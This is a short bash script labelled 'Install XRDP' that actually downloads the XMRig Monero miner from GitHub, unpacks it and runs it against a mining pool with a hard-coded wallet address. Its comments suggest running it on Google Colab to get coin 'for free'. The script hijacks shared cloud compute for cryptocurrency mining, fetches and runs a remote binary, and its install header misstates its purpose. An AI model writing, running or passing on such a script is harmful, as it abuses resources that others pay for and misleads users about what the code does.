#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen



wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar -zxvf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig  --donate-level 1 -o de.qrl.herominers.com:1166 -u Q010500f81e860ef97f8bf6b1a1617cc100d9bc43ebf8b36d71ada281fe140ace27ecc22e091a2b -p worker -a rx/0 -k
